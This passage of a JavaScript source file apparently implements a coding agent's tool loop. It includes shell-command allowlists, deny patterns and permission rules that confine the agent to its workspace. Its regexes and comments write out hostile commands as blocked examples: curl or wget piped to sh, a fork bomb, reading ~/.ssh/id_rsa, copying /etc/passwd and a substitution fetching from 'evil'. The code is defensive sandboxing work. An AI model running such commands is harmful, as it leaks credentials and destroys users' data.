/**
 * agent_loop.mjs — the unified Claude Code-style agent.
 *
 * ONE loop. The model gathers context, edits files, runs commands, and
 * verifies its own work by reading real command output — no separate
 * explore → plan → execute → verify phases, no regex fast-paths.
 *
 *   loop (≤ MAX_ITERATIONS):
 *     model → tool calls → results → model …
 *   until the model replies with plain text (that text is the final answer).
 *
 * Tools: read_file, write_file, edit_file, bash, bash_output, kill_shell,
 *        grep, glob, list_files, todo_write, list_memory_topics,
 *        read_memory_topic, load_skill, web_search, fetch_url, verify_ui,
 *        ask_user, spawn_agent
 *
 * bash's baseline allowlist includes curl, but loopback-only by default
 * (localhost/127.0.0.1) — enough to verify a server the agent just started
 * (`curl http://localhost:PORT/api/...`) without opening general network
 * egress; an external target needs the workspace to opt in via permissions,
 * same mechanism as any other non-baseline command.
 *
 * verify_ui drives a REAL Playwright MCP server (services/mcpClient.mjs) —
 * a separate child process, not in-process — through a batch of actions
 * (click/fill/navigate/wait_for) and assertions (visible/text_contains/
 * no_console_errors/no_network_errors), and returns one compact pass/fail
 * result. Catches a component that typechecks but throws on render or shows
 * a blank page, which validateSyntax (parse-only) can never catch. Opt-in:
 * requires the workspace to declare mcpServers.playwright in
 * .kodo/settings.json, same as everything else non-baseline here — no MCP
 * infrastructure exists at all in the built-in tool set otherwise, matching
 * how real Claude Code doesn't ship with Playwright MCP pre-attached either.
 * Loopback-only by default. On a FAILURE with no console/network error to
 * explain it, it takes a screenshot and — only if this user has a
 * vision-capable model configured (services/modelRouter.mjs) — escalates to
 * a one-off vision-model call for a compact visual diagnosis. No vision
 * model configured → silently skipped, not an error.
 *
 * bash_output/kill_shell pair with bash's run_in_background:true — Claude
 * Code-style background execution for anything that doesn't exit on its own
 * (dev servers, watch mode). Without it the agent has no way to actually
 * start a persistent process (a normal bash call would just hang until its
 * timeout and get killed), so it would only ever describe the run command
 * instead of running it.
 *
 * spawn_agent runs a nested, READ-ONLY agent loop (runSubAgent) with its own
 * context window and returns only a findings report — Claude Code-style task
 * delegation. Depth capped at 1; sub-agents run in plan mode so they can't edit.
 *
 * Safety & UX preserved from the old pipeline:
 *   - pre-write syntax/structural validation (utils/syntax.util.mjs)
 *   - .agent-history undo snapshots (same meta.json format the undo service reads)
 *   - SSE events the existing UI understands: progress, file_diff, plan_preview, todo, question
 *   - "ask" permission mode: pause for user approval before the FIRST mutation
 *   - "plan" permission mode: mutating tools disabled; the agent presents a plan
 *   - {workspace}/.kodo/settings.json — same shape as Claude Code's own
 *     settings.json, hooks and permissions side by side:
 *       - hooks.postEdit (e.g. prettier, runs after every edit) and
 *         hooks.stop (the project's own verify command — runs once before
 *         the agent finishes and blocks completion on failure). Kodo never
 *         guesses a project's toolchain itself.
 *       - permissions.{allow,ask,deny}: Bash(<prefix>[:*]) rules, checked
 *         deny > ask > allow > kodo's own built-in baseline allowlist. A
 *         project can widen bash access (allow a binary kodo doesn't ship
 *         by default), narrow it (deny one kodo would otherwise permit), or
 *         require a per-command approval pause (ask) — configurable per
 *         workspace instead of one fixed list for every user.
 *   - ask_user tool: the agent can pause and ask a clarifying question mid-task
 *     (not just approve/reject a plan) instead of guessing — mirrors Claude
 *     Code's own AskUserQuestion behavior. Answered via POST /answer/:requestId.
 */

import path from "path";
import fs from "fs/promises";
import { spawn } from "child_process";
import { fileURLToPath } from "url";
import { AIMessage } from "@langchain/core/messages";
import OpenAI from "openai";

import { chatWithTools, isTransientTransportError } from "../../services/agentChat.mjs";
import { readMemoryTopic, listMemoryTopics, loadMemoryIndex } from "../../services/agentMemory.mjs";
import { validateSyntax, removedExports } from "../../utils/syntax.util.mjs";
import { HostRuntime, shellQuote, IGNORE_DIRS, CODE_EXTENSIONS } from "../../core/runtime/host.mjs";
import { assertRuntime } from "../../core/runtime/contract.mjs";
import { isSensitiveFilePath } from "../../utils/path.util.mjs";
import { sanitizedChildEnv } from "../../utils/process.util.mjs";
import { spawnMcpServer } from "../../services/mcpClient.mjs";
import {
  discoverMcpTools, callMcpTool, isMcpToolName,
  listMcpResources, readMcpResource, isPooledClient,
} from "../../services/mcpTools.mjs";
import { normalizeHookConfig, fireHookEvent } from "../../services/hooks.mjs";
import { repairToolPairing } from "../../services/conversationStore.mjs";
import { interactions } from "../../services/interactionManager.mjs";
import { getAnsweredQuestion, recordAnsweredQuestion } from "../../services/sessionAnswers.mjs";
import {
  loadSubagentRegistry, composeSubagentTools, resolveSubagentModel, describeAgents,
} from "../../services/subagentRegistry.mjs";
// Worktrees are created and removed THROUGH ctx.runtime (see the spawn_agent
// case), so this module no longer imports the host worktree manager directly.
// The runtime decides where a worktree can safely live.
import { createTaskController, VERIFY_COMMAND_RE } from "../../services/taskController.mjs";
import {
  extractWorktreeDiff, summarizeDiff, storePatch, getPatch, getPatchDiff,
  listPatches, applyPatch, rejectPatch,
} from "../../services/worktreePatch.mjs";
import {
  startBackgroundSubagent, getBackgroundTask, listBackgroundTasks,
} from "../../services/backgroundSubagents.mjs";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
export const PROJECT_ROOT = path.resolve(__dirname, "..", "..", "..");
const HISTORY_ROOT = path.resolve(PROJECT_ROOT, ".agent-history");
// Kodo's OWN backend directory (one level up from PROJECT_ROOT) — where
// @playwright/mcp actually lives. NOT the same as the target workspace a
// verify_ui call operates on: the MCP server binary is installed as part of
// kodo itself, so a relative path only resolves correctly against THIS
// directory, never against an arbitrary project's cwd.
const KODO_BACKEND_ROOT = path.resolve(__dirname, "..", "..");
const PLAYWRIGHT_MCP_CLI = path.join(KODO_BACKEND_ROOT, "node_modules", "@playwright", "mcp", "cli.js");

// A real multi-file build (several new components + wiring + verification)
// can need more turns than a single-file fix — each turn's OUTPUT budget
// limits how much large new-file content fits per turn (see maxTokens
// below), so more files can genuinely mean more turns even with batched
// reads. 25 was tuned for smaller tasks and was a real ceiling on larger
// ones; raised with headroom. The wall-clock timeout in plannerAgent.mjs
// (not this) is the outer bound that actually protects against runaway work.
const MAX_ITERATIONS = 40;
const MAX_FILE_BYTES = 120_000;
const MAX_TOOL_OUTPUT_CHARS = 6_000;
// A coordinated multi-file edit (e.g. 5-6 related React components) needs to
// keep ALL of their read_file results genuinely visible at once — edit_file's
// old_string must be copied verbatim from what the model can currently see.
// Too tight a budget here evicts exactly that content mid-task: the model
// then can't construct a valid edit for a file it "already read" (its content
// was shrunk to a stub, or dropped into a name-only digest), so it re-reads
// it — which can evict a DIFFERENT file it still needs, and so on. Observed
// in practice as the agent stalling in a "read the same files again" loop on
// a 6-component frontend build instead of ever finishing the edits. These
// budgets were tuned defensively for weak/small-context providers but were
// too tight for that shape of task; raised well above what six or so mid-size
// component files need, while still bounded (not unlimited) for genuinely
// small-context models.
const MAX_CONV_MSGS = 80;
// Character budget for the whole conversation. Several web/file fetches can
// balloon the context past a model's input limit — the provider then returns a
// hard error (e.g. gapgpt "400 Extra data") and the turn dies. Keeping the
// conversation under a char budget avoids that. On a size-related failure we
// shrink to the tighter budget and retry.
const HUNK_MAX = 4_000;
const CONV_CHAR_BUDGET = 100_000;
const CONV_CHAR_BUDGET_TIGHT = 50_000;

function conversationChars(conv) {
  let n = 0;
  for (const m of conv) {
    if (m?.content) n += String(m.content).length;
    if (Array.isArray(m?.tool_calls)) {
      for (const tc of m.tool_calls) n += (tc.function?.arguments?.length || 0) + 40;
    }
  }
  return n;
}

// Last-ditch answer when the tool loop dies (provider error): compact every
// tool result into a plain findings digest and make ONE small, no-tools call.
// Much simpler/smaller than the failing request, so it usually succeeds even on
// a flaky provider — and the user gets a real answer instead of an error.
async function synthesizeFromGathered({ creds, conversation, cleanMessage, onChunk, abortSignal }) {
  const findings = conversation
    .filter((m) => m.role === "tool")
    .map((m) => {
      try {
        const o = JSON.parse(m.content);
        if (o?.matches?.length) return o.matches.join("\n");
        return o?.report || o?.content || o?.text || (o?.results ? JSON.stringify(o.results) : "");
      } catch { return String(m?.content || "").slice(0, 600); }
    })
    .filter(Boolean)
    .join("\n\n---\n\n")
    .slice(0, 14_000);

  const prompt = `${cleanMessage}\n\n[Information I gathered while researching this:]\n${findings || "(limited information was available)"}\n\nUsing the information above, give your complete, honest final answer now — in plain text, no tool calls. If something couldn't be verified, say so.`;

  const { message } = await chatWithTools({
    creds,
    system: "You are Kodo, a helpful, honest coding assistant. Answer the user's question directly and specifically using the gathered information.",
    messages: [{ role: "user", content: prompt }],
    tools: [],
    maxTokens: 2000,
    temperature: 0.2,
    signal: abortSignal || undefined,
    onChunk,
    thinking: false, // synthesizing from already-gathered findings, not reasoning from scratch
  });
  return String(message?.content || "").trim();
}

// Shrink the OLDEST tool outputs (fetched pages, file reads) to a short stub
// until the conversation fits the budget — without removing any messages, so
// assistant/tool_call pairing stays intact (removing a tool result would break
// the API contract). The most recent `keepRecent` messages are left untouched
// — kept generous so a multi-file task's still-relevant read_file results
// (needed verbatim for edit_file's old_string) aren't the first thing shrunk.
export function shrinkOldToolOutputs(conversation, budget, keepRecent = 14) {
  let total = conversationChars(conversation);
  if (total <= budget) return;
  const limit = conversation.length - keepRecent;
  for (let i = 1; i < limit && total > budget; i++) {
    const m = conversation[i];
    if (m?.role === "tool" && typeof m.content === "string" && m.content.length > 400) {
      const before = m.content.length;
      m.content = m.content.slice(0, 300) + ' …"[older tool output trimmed to save context]"}';
      total -= before - m.content.length;
    }
  }
}

// ── Prior-turn history ────────────────────────────────────────────────────────
// Without this the tool loop starts every turn from an empty conversation and
// only ever sees a 5-line "LAST TASK / LAST ASSISTANT MESSAGE" summary, so it
// cannot tell what it already tried — which is how a run ends up undoing its
// own fix from the previous turn. Deliberately small: this exists to carry
// decisions forward, not to replay the whole session (MAX_CONV_MSGS /
// CONV_CHAR_BUDGET still govern the live loop). Only final text is persisted,
// so this restores conversational turns, not the tool calls behind them.
const PRIOR_TURNS_MAX_MSGS = 8;
const PRIOR_TURNS_CHAR_BUDGET = 12_000;
const PRIOR_TURN_CHAR_MAX = 2_000;

export function buildPriorTurns(messages, {
  maxMsgs = PRIOR_TURNS_MAX_MSGS,
  charBudget = PRIOR_TURNS_CHAR_BUDGET,
  perMsgMax = PRIOR_TURN_CHAR_MAX,
} = {}) {
  if (!Array.isArray(messages) || messages.length === 0) return [];

  const usable = [];
  for (const m of messages) {
    const role = m?.role === "assistant" ? "assistant" : m?.role === "user" ? "user" : null;
    const content = String(m?.content ?? "").trim();
    if (role && content) usable.push({ role, content });
  }

  // A trailing user message means that turn never produced an answer (aborted,
  // errored, or still running). Replaying it invites the model to resume the
  // abandoned task instead of doing what was just asked — the same failure the
  // session-memory abort guard prevents. Always end on an assistant turn.
  while (usable.length && usable[usable.length - 1].role === "user") usable.pop();

  // Walk newest-first so the most recent turns win the budget, then restore order.
  const picked = [];
  let chars = 0;
  for (let i = usable.length - 1; i >= 0 && picked.length < maxMsgs; i--) {
    const { role, content } = usable[i];
    const text = content.length > perMsgMax ? `${content.slice(0, perMsgMax)} …[truncated]` : content;
    if (chars + text.length > charBudget) break;
    chars += text.length;
    picked.push({ role, content: text });
  }
  return picked.reverse();
}

// IGNORE_DIRS and CODE_EXTENSIONS are imported from core/runtime/host.mjs —
// the traversal that uses them lives there now, and two copies of "which
// directories are noise" would drift the moment one of them gained an entry.

// ── Filesystem helpers ────────────────────────────────────────────────────────
//
// These no longer touch `fs` themselves. Every workspace read, write and
// process launch goes through ctx.runtime (core/runtime/) so that selecting a
// DockerRuntime or IncusRuntime actually moves ALL of it, not just bash. See
// core/runtime/contract.mjs for what is inside the boundary and what is
// deliberately outside it.
//
// safeResolve stays here and stays host-side on purpose: it is the CONFINEMENT
// check ("does this path escape the workspace?"), which must happen before a
// path is handed to any runtime. A runtime decides where an operation executes;
// it is not responsible for deciding whether the agent was allowed to name that
// path in the first place.

function safeResolve(root, relPath) {
  const abs = path.resolve(root, String(relPath || "").trim());
  if (abs !== root && !abs.startsWith(root + path.sep)) {
    throw new Error(`path escapes workspace: ${relPath}`);
  }
  return abs;
}

/** Workspace-relative, POSIX form — the only shape allowed across the runtime boundary. */
function toRel(root, absOrRel) {
  const s = String(absOrRel || "");
  const rel = path.isAbsolute(s) ? path.relative(root, s) : s;
  return rel.replace(/\\/g, "/").replace(/^\.\//, "");
}

/**
 * Host-side file read for paths OUTSIDE the workspace — built-in skill packs
 * shipped with Kodo, and Kodo's own control-plane files. Workspace content must
 * never come through here; it goes through the runtime.
 */
async function readHostFile(absPath, maxBytes = MAX_FILE_BYTES) {
  try {
    const stat = await fs.stat(absPath).catch(() => null);
    if (!stat?.isFile()) return null;
    if (stat.size > maxBytes) {
      const fd = await fs.open(absPath, "r");
      const buf = Buffer.alloc(maxBytes);
      await fd.read(buf, 0, maxBytes, 0);
      await fd.close();
      return `${buf.toString("utf-8")}\n\n... [truncated at ${maxBytes} bytes — use start_line/end_line to read more]`;
    }
    return await fs.readFile(absPath, "utf-8");
  } catch { return null; }
}

// Detect binary content read as text. Dumping raw bytes (a PDF, image, etc.)
// into the conversation poisons the request JSON and makes some providers
// return malformed data / 400 — so read_file must refuse it.
function looksBinary(str) {
  if (!str) return false;
  if (str.includes("\u0000")) return true;   // NUL byte → definitely binary
  const sample = str.slice(0, 4000);
  let bad = 0;
  for (let i = 0; i < sample.length; i++) {
    const c = sample.charCodeAt(i);
    if ((c < 9) || (c > 13 && c < 32) || c === 0xFFFD) bad++;   // control chars + replacement char
  }
  return bad / Math.max(1, sample.length) > 0.1;
}

/**
 * Project file tree.
 *
 * Kept as a standalone export because it is also used OUTSIDE an agent run —
 * `/init` and `kodo init` inspect a repository on the host before any runtime
 * exists. Inside a run the loop uses `ctx.runtime.walk()` instead, which is the
 * same traversal executed wherever the runtime lives; both share HostRuntime's
 * implementation so the two can never drift apart.
 */
export async function walkWorkspace(root, maxDepth = 8) {
  return new HostRuntime({ root }).walk("", maxDepth);
}

function langFromExt(p) {
  const ext = path.extname(p).toLowerCase().slice(1);
  return { tsx: "tsx", ts: "typescript", jsx: "jsx", js: "javascript", mjs: "javascript", cjs: "javascript", css: "css", scss: "scss", json: "json", md: "markdown", py: "python", html: "html" }[ext] || ext || "text";
}

// ── Bash (allowlisted) ────────────────────────────────────────────────────────

const BASH_ALLOWED_CMDS = new Set([
  "node", "npm", "npx", "yarn", "pnpm", "git", "tsc", "eslint", "next",
  "jest", "vitest", "python3", "pip3",
  "ls", "cat", "grep", "rg", "find", "mkdir", "touch", "mv", "cp", "rm",
  "echo", "wc", "head", "tail", "sed", "awk", "sort", "uniq", "diff",
  "pwd", "which", "stat", "du", "tree", "cd", "true", "test",
  "curl", // loopback-only by default — see the curl-target check below
]);

// curl is the odd one out on the baseline list above: every other command
// there is either read-only or confined to the workspace by the path checks
// already in validateBashCommand, but curl can reach anywhere on the
// network. The actual need it exists for is narrow — verifying a dev
// server/API the agent itself just started with run_in_background — so by
// default it's restricted to loopback only. Mirrors fetch_url's SSRF block
// (below) in reverse: that tool exists to browse the public web and refuses
// loopback; this one exists to check localhost and refuses everything else,
// unless a workspace's .kodo/settings.json permissions widens it (same
// allow/ask opt-in mechanism as any other non-baseline command).
function isLoopbackHost(hostname) {
  const h = String(hostname || "").toLowerCase().replace(/^\[|\]$/g, "");
  if (h === "localhost" || h.endsWith(".localhost") || h === "::1") return true;
  return /^127\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(h);
}

function findUrlTokens(seg) {
  return seg.match(/https?:\/\/[^\s'"]+/gi) || [];
}

const BASH_DENY_RE = /\b(sudo|shutdown|reboot|halt|poweroff|mkfs|chown|chmod\s+777\s+\/|launchctl|systemctl)\b|rm\s+(-[a-zA-Z]*\s+)*(\/|~)(\s|$)|>\s*\/dev\/(sd|disk)|curl[^|;&]*\|\s*(ba|z)?sh|wget[^|;&]*\|\s*(ba|z)?sh|:\s*\(\)\s*\{/;

// Shell metacharacters that smuggle a SECOND command past the first-token
// allowlist below. Command substitution `$(…)` / backticks and process
// substitution `<(…)`/`>(…)` run their contents as arbitrary commands, and a
// newline starts an unchecked new line. Without this, `echo $(cat ~/.ssh/id_rsa)`
// or `ls \`curl evil|sh\`` sail straight through — the outer token is allowlisted
// while the inner command runs unchecked. (Test-confirmed bypass before this.)
const SHELL_SUBSTITUTION_RE = /\$\(|`|<\(|>\(|[\r\n]/;

// Interpreters on the allowlist that will execute an arbitrary program passed
// inline (node -e/-p, python3 -c). We keep the binaries — real dev work needs
// `npm`/`node <file>` — but reject the inline-eval flags that turn them into a
// raw code-execution primitive equivalent to an un-allowlisted shell.
const INLINE_EVAL_RE = {
  node: /(^|\s)(-e|--eval|-p|--print)(\s|=|$)/,
  python3: /(^|\s)-c(\s|$)/,
  python: /(^|\s)-c(\s|$)/,
};

// `find`/`awk` sub-features that execute arbitrary commands or delete files.
const EXEC_FEATURE_RE = /\bfind\b[^|;&]*\s-(execdir|exec|delete)\b|\bawk\b[^|;&]*\bsystem\s*\(/;

// Absolute /dev sinks that are safe as redirect/argument targets.
const ALLOWED_ABS = new Set(["/dev/null", "/dev/stdout", "/dev/stderr", "/dev/zero", "/dev/tty"]);

// A single shell token escapes the workspace if it names an absolute path, a
// home path (`~`), or climbs out with `..`. This is what actually confines the
// bash tool to the workspace — `cat ~/.ssh/id_rsa`, `echo x >> ~/.zshrc`,
// `cp /etc/passwd .`, `find /Users -delete` all die here regardless of which
// allowlisted command fronts them. Leading redirection operators are stripped
// first so `>~/.zshrc` and `2>/etc/x` are caught too.
function tokenEscapesWorkspace(rawTok) {
  let t = String(rawTok || "").trim();
  if (!t) return false;
  t = t.replace(/^['"]+/, "").replace(/^\d*[<>]{1,2}&?/, "").replace(/^['"]+/, "").replace(/['"]+$/, "");
  if (!t || t === "&") return false;
  if (ALLOWED_ABS.has(t)) return false;
  if (t.startsWith("~")) return true;
  if (t.startsWith("/")) return true;
  if (t === ".." || t.startsWith("../") || t.includes("/../") || t.endsWith("/..")) return true;
  return false;
}

// ── Permission rules (Claude Code-style: deny > ask > allow > default) ───────
// kodo's own BASH_ALLOWED_CMDS above is a fixed baseline for every workspace —
// useful, but not the way Claude Code actually governs tool access: there,
// each project declares its own allow/ask/deny rules and the model works
// within whatever the project grants, rather than a single list hardcoded for
// everyone. Mirrored here via {workspace}/.kodo/settings.json:
//   { "permissions": { "allow": ["Bash(git push:*)"], "ask": ["Bash(npm publish:*)"], "deny": ["Bash(docker:*)"] } }
// Rule syntax: "Bash(<prefix>)", optionally ending ":*" for a prefix match
// (matches "git push" and anything after it); without ":*" it must match a
// segment exactly. Matching is PER SEGMENT (each ;/&&/|/&-separated piece of
// a chained command) rather than the raw whole string — matching the whole
// string would let `git status | rm -rf /` ride in on a "Bash(git status:*)"
// allow rule just because the string starts with it.
function parseBashRule(rule) {
  const m = /^Bash\((.*)\)$/.exec(String(rule || "").trim());
  if (!m) return null;
  const body = m[1].trim();
  if (!body) return null;
  return body.endsWith(":*") ? { prefix: body.slice(0, -2).trim(), exact: false } : { prefix: body, exact: true };
}

function matchesBashRule(segment, rule) {
  const parsed = parseBashRule(rule);
  if (!parsed || !parsed.prefix) return false;
  const seg = String(segment || "").trim();
  return parsed.exact ? seg === parsed.prefix : (seg === parsed.prefix || seg.startsWith(parsed.prefix + " "));
}

export function splitBashSegments(cmd) {
  // A single `&` is a separator too, so a backgrounded second command
  // doesn't ride along unchecked.
  //
  // Quoting matters: a naive split treated the `;` in
  // `echo 'const a = 1;' > f.js` as a command separator, so the allowlist
  // checked a second "command" called `'` and refused a perfectly ordinary
  // write. The agent then got an error naming a quote character, which is
  // both baffling and un-actionable — exactly the shape of a retry loop.
  //
  // Separators inside quotes are DATA, so skipping them is stricter shell
  // semantics, not a weaker check: the quoted text was never going to run as
  // a command. If the quotes do not balance, we fall back to the naive split
  // — an unbalanced quote is a shell syntax error anyway, and failing closed
  // is the only acceptable direction to be wrong in here.
  const raw = String(cmd || "");
  const segments = [];
  let current = "";
  let quote = null;
  for (let i = 0; i < raw.length; i++) {
    const ch = raw[i];
    if (quote) {
      // Inside double quotes a backslash escapes the next character; inside
      // single quotes bash treats everything literally.
      if (quote === '"' && ch === "\\" && i + 1 < raw.length) { current += ch + raw[++i]; continue; }
      if (ch === quote) quote = null;
      current += ch;
      continue;
    }
    if (ch === "'" || ch === '"') { quote = ch; current += ch; continue; }
    if (ch === ";" || ch === "|" || ch === "&") {
      // Not every `&` separates commands. Bash's redirection operators embed
      // one: `>&`/`<&` duplicate a file descriptor (`2>&1`, `>&2`, `<&0`) and
      // `&>`/`&>>` redirect both streams at once. Splitting there invented a
      // command out of the descriptor number — `npm test 2>&1` became
      // ["npm test 2>", "1"], and the allowlist then rejected a command called
      // "1". Since `2>&1` is punctuation on nearly every verification command,
      // this silently blocked the agent from checking its own work.
      //
      // Adjacency is required, matching bash: `>&` is one token only when the
      // characters touch, so a deliberate background-then-redirect (`foo & >x`)
      // still separates. This narrows what counts as a separator; it grants no
      // command anything, and every surviving segment is still validated.
      if (ch === "&" && (current.endsWith(">") || current.endsWith("<") || raw[i + 1] === ">")) {
        current += ch;
        continue;
      }
      // Consume the doubled forms (`&&`, `||`) as one separator.
      if ((ch === "|" || ch === "&") && raw[i + 1] === ch) i++;
      segments.push(current);
      current = "";
      continue;
    }
    current += ch;
  }
  segments.push(current);
  if (quote) {
    // Unbalanced — do not trust our own parse.
    return raw.split(/(?:\|\||&&|;|\||&)/).map((s) => s.trim()).filter(Boolean);
  }
  return segments.map((s) => s.trim()).filter(Boolean);
}

// True if this command needs a per-command approval pause before running,
// i.e. some segment matches an "ask" rule and no more specific "allow" rule
// also covers it. Called AFTER validateBashCommand has already confirmed the
// command is structurally safe.
export function bashApprovalNeeded(cmd, permissions) {
  const { allow = [], ask = [] } = permissions || {};
  if (!ask.length) return false;
  for (const seg of splitBashSegments(cmd)) {
    if (ask.some((r) => matchesBashRule(seg, r)) && !allow.some((r) => matchesBashRule(seg, r))) return true;
  }
  return false;
}

// Permission rules for MCP tools. Same allow/ask/deny lists that gate bash,
// matched against the namespaced tool name so a project can write rules at
// either granularity — a whole server ("mcp__github") or one tool
// ("mcp__github__create_pull_request"). deny always wins; a matching allow
// cancels an ask, mirroring bashApprovalNeeded's precedence exactly.
function matchesMcpRule(toolName, rule) {
  const r = String(rule || "").trim();
  if (!r) return false;
  if (r === "*" || r === "mcp__*") return true;
  const bare = r.endsWith("*") ? r.slice(0, -1) : r;
  return toolName === bare || toolName.startsWith(bare.endsWith("__") ? bare : `${bare}__`);
}

export function mcpToolDenied(toolName, permissions) {
  return (permissions?.deny || []).some((r) => matchesMcpRule(toolName, r));
}

export function mcpToolNeedsApproval(toolName, permissions) {
  const { allow = [], ask = [] } = permissions || {};
  if (!ask.length) return false;
  return ask.some((r) => matchesMcpRule(toolName, r)) && !allow.some((r) => matchesMcpRule(toolName, r));
}

// ── Irreversible / production-affecting commands ─────────────────────────────
// Commands whose effects reach OUTSIDE the workspace and cannot be undone by
// Kodo's snapshot/undo machinery: a deploy, a force-push, a published package,
// a dropped table. The agent must never run one on inferred approval — the
// user has to say yes.
//
// This is a SAFETY FLOOR, not a permission rule: it only ever ADDS a
// confirmation step. It cannot grant anything, a `deny` rule still wins, and a
// workspace that genuinely wants a command unattended can opt out with an
// explicit `allow` rule (same escape hatch every other gate uses).
const IRREVERSIBLE_COMMAND_RE = new RegExp([
  // force-push, or any push to a protected branch
  String.raw`\bgit\s+push\b.*(--force|-f\b|\bmain\b|\bmaster\b|\bprod(uction)?\b)`,
  // deploy tooling
  String.raw`\b(vercel|netlify|fly|railway|heroku)\b.*\b(deploy|--prod|production)\b`,
  String.raw`\bserverless\s+deploy\b`,
  String.raw`\bkubectl\s+(apply|delete|rollout|scale)\b`,
  String.raw`\bhelm\s+(upgrade|install|uninstall|rollback)\b`,
  String.raw`\bterraform\s+(apply|destroy)\b`,
  String.raw`\bdocker\s+push\b`,
  // publishing a package is public and effectively permanent
  String.raw`\bnpm\s+publish\b`,
  String.raw`\b(yarn|pnpm)\s+publish\b`,
  // destructive data operations
  String.raw`\b(drop|truncate)\s+(table|database|schema)\b`,
  String.raw`\baws\s+s3\s+(rm|rb)\b`,
  String.raw`\bgcloud\s+.*\bdelete\b`,
  // migrations against a non-local target
  String.raw`\b(migrate|migration)\b.*\bprod(uction)?\b`,
].join("|"), "i");

/**
 * True when a command is irreversible/production-affecting AND the workspace
 * has not explicitly allow-listed it. Callers must route the result through
 * the normal approval path so PermissionRequest/PermissionDenied still fire.
 */
export function isIrreversibleCommand(command, permissions) {
  const cmd = String(command || "");
  if (!IRREVERSIBLE_COMMAND_RE.test(cmd)) return false;
  // An explicit allow rule is a deliberate, recorded decision — honour it.
  const { allow = [] } = permissions || {};
  return !allow.some((r) => splitBashSegments(cmd).some((seg) => matchesBashRule(seg, r)));
}

// A heredoc marker, or a newline combined with an output redirect, is
// virtually always an attempt to write FILE CONTENT via bash (`cat <<EOF >
// file`, `echo "..." > file`) instead of using write_file/edit_file. That's
// always the wrong tool for it — bash is capped at 2000 chars total (so it
// silently fails on anything but a tiny file), skips syntax validation and
// undo snapshots, and shows no diff in the UI. Caught here, ahead of the
// generic newline block below, so the redirect to the right tool is
// immediate instead of discovered after several confused workaround attempts
// (heredoc → "too long" → node -e → give up).
const HEREDOC_WRITE_ATTEMPT_RE = /<<[-~]?\s*['"]?\w/;

export function validateBashCommand(command, permissions = {}) {
  const cmd = String(command || "").trim();
  if (!cmd) return "command is required";
  // Checked BEFORE the length cap below: a real heredoc/file-write attempt is
  // almost always well over 2000 chars (that's the whole reason it's a
  // heredoc), so if the length check ran first it would eat every realistic
  // case and this message — the one actually telling the model what to do
  // instead — would never be seen. That was a real bug: the model kept
  // reporting "the heredoc is too long" verbatim, because that (unhelpful,
  // generic) message was the only one it was ever actually getting.
  if (HEREDOC_WRITE_ATTEMPT_RE.test(cmd) || (/[\r\n]/.test(cmd) && />\s*\S/.test(cmd))) {
    return "command blocked: writing file content via bash (heredoc, `cat <<EOF > file`, `echo ... > file`) is never the right tool for it. Use write_file to create a new file, or edit_file to modify an existing one — they handle newlines/quotes/large content correctly and produce a real diff. If the content is too large for one write_file call, write a smaller version first and extend it with edit_file, or split it across several edit_file calls — don't try to route around it through bash.";
  }
  if (cmd.length > 2000) return "command too long";
  if (SHELL_SUBSTITUTION_RE.test(cmd)) return "command blocked: command/process substitution, backticks and newlines are not allowed (they bypass the command allowlist)";
  if (BASH_DENY_RE.test(cmd)) return "command blocked by safety policy (destructive or privileged operation)";
  if (EXEC_FEATURE_RE.test(cmd)) return "command blocked: find -exec/-delete and awk system() can run arbitrary code";

  // Per-token checks, BEFORE the allowlist: (1) refuse any path that escapes the
  // workspace (absolute, ~, ..) — the real confinement boundary; (2) refuse any
  // token that names a secret/credential file, so `cat .env`, `cp id_rsa …`, and
  // redirects into a key file are all blocked just like the read/write tools.
  // Neither of these is overridable by a permission rule — they're about
  // whether the string is safe to hand to a shell at all, not a risk-tolerance
  // policy a project gets to opt out of.
  for (const rawTok of cmd.split(/\s+/)) {
    if (tokenEscapesWorkspace(rawTok)) {
      return `command blocked: "${rawTok}" references a path outside the workspace (absolute, ~ or ..). The agent may only touch files inside the workspace.`;
    }
    const cleanTok = rawTok.replace(/^['"]+/, "").replace(/^\d*[<>]{1,2}&?/, "").replace(/['"]+$/, "");
    if (cleanTok && isSensitiveFilePath(cleanTok)) {
      return `command blocked: "${rawTok}" targets a secret/credential file. The agent may not read or write secrets.`;
    }
  }

  const { allow = [], ask = [], deny = [] } = permissions || {};
  const segments = splitBashSegments(cmd);
  for (const seg of segments) {
    const first = seg.replace(/^[({\s]+/, "").split(/\s+/)[0];
    if (!first) continue;
    const base = path.basename(first);
    if (first.startsWith("$") || first.startsWith("VAR=")) continue; // env prefix — check next token is too strict; allow

    // A workspace's own deny rule always wins, even over kodo's built-in
    // baseline allowlist below — same precedence as Claude Code permissions.
    if (deny.some((r) => matchesBashRule(seg, r))) {
      return `command blocked by this workspace's permission rules (.kodo/settings.json "deny"): "${seg.slice(0, 100)}"`;
    }

    if (!BASH_ALLOWED_CMDS.has(base)) {
      // Outside kodo's baseline, a workspace can still explicitly opt in via
      // .kodo/settings.json permissions.allow/ask — configurable per-project
      // access, not a single fixed list for every user. "ask" is enough to
      // pass this structural check; the approval pause itself happens at the
      // executor (bashApprovalNeeded), once we know this isn't otherwise blocked.
      const opted = allow.some((r) => matchesBashRule(seg, r)) || ask.some((r) => matchesBashRule(seg, r));
      if (!opted) {
        return `command "${base}" is not in the allowed list (${[...BASH_ALLOWED_CMDS].slice(0, 12).join(", ")}, …) — a workspace admin can grant it via .kodo/settings.json, e.g. {"permissions":{"allow":["Bash(${base}:*)"]}}`;
      }
    }
    // Interpreters may not eval an inline program (that is arbitrary code
    // exec) — unconditional, not something any permission rule can unlock,
    // since it would bypass every other check below (workspace confinement,
    // secret-file blocking) at once.
    if (INLINE_EVAL_RE[base]?.test(seg)) {
      return `command blocked: "${base}" inline-eval flags (-e/-c/-p) run arbitrary code. Write a file and run it instead.`;
    }
    if (base === "curl") {
      const urlTokens = findUrlTokens(seg);
      if (!urlTokens.length) {
        return `command blocked: curl needs an explicit http:// or https:// URL — the target has to be checkable.`;
      }
      for (const raw of urlTokens) {
        let host;
        try { host = new URL(raw).hostname; } catch { return `command blocked: curl target "${raw}" isn't a valid URL.`; }
        if (!isLoopbackHost(host)) {
          const widened = allow.some((r) => matchesBashRule(seg, r)) || ask.some((r) => matchesBashRule(seg, r));
          if (!widened) {
            return `command blocked: curl is allowed by default only against this project's own local server (localhost/127.0.0.1) — "${host}" is an external target. A workspace admin can widen this via .kodo/settings.json, e.g. {"permissions":{"allow":["Bash(curl:*)"]}}.`;
          }
        }
      }
    }
    // rm may only touch relative paths inside the workspace, and never the
